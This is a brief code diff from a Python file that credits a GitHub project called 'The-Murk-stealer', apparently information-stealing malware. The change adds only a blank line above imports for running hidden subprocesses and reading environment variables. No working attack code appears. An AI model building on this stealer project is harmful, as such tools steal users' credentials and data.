@@ -9,6 +9,7 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
+
 from subprocess import STARTUPINFO,STARTF_USESHOWWINDOW,run
 from os import sep,environ
 from manager.logger import Log
